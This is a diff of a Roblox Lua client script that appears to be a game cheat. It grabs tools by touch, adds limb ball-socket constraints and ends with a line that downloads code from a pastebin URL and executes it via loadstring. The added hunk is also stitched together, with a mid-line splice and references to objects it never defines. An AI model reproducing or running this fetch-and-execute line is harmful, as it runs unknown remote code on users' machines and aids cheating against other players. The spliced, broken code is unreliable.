@@ -1744,4 +1744,86 @@ cRarm.Touched:Connect(function(t)
     if t:IsA("BasePart") and t.Parent.Parent == workspace and t.Parent:IsA("Tool") then
         game.Players.LocalPlayer.Character.Humanoid:EquipTool(t.Parent)
     end
-end)
+end) local CharacterAdded
+
+	
+
+	CharacterAdded = Client.CharacterAdded:Connect(function()
+
+		RenderStepped:Disconnect()
+
+		CharacterAdded:Disconnect()
+
+		PlayerAdded:Disconnect()
+
+		
+
+		ViewHUD:Destroy()
+
+		ViewHUD = nil
+
+	end)
+
+	
+
+	wait(9e9)
+
+end;
+
+Script()
+
+wait(2)
+
+local Players = game:GetService("Players")
+
+local lp = Players.LocalPlayer
+
+local character = lp.Character
+
+local A0LL = Instance.new("Attachment", character["Left Leg"])
+
+A0LL.Position = Vector3.new(0, 1, 0)
+
+local A1LL = Instance.new("Attachment", character["Torso"])
+
+A1LL.Position = Vector3.new(-0.5, -1, 0)
+
+local socket1 = Instance.new("BallSocketConstraint", character["Left Leg"])
+
+socket1.Attachment0 = A0LL
+
+socket1.Attachment1 = A1LL
+
+local A0RL = Instance.new("Attachment", character["Right Leg"])
+
+A0RL.Position = Vector3.new(0, 1, 0)
+
+local A1RL = Instance.new("Attachment", character["Torso"])
+
+A1RL.Position = Vector3.new(0.5, -1, 0)
+
+local socket2 = Instance.new("BallSocketConstraint", character["Right Leg"])
+
+socket2.Attachment0 = A0RL
+
+socket2.Attachment1 = A1RL
+
+local A0H = Instance.new("Attachment", character["Head"])
+
+A0H.Position = Vector3.new(0, -0.5, 0)
+
+local A1H = Instance.new("Attachment", character["Torso"])
+
+A1H.Position = Vector3.new(0, 1, 0)
+
+local socket5 = Instance.new("BallSocketConstraint", character["Head"])
+
+socket5.Attachment0 = A0H
+
+socket5.Attachment1 = A1H
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Byd1PdHn",true))()
+
+-----------------------------------------------------------
+
+wait(9e9)
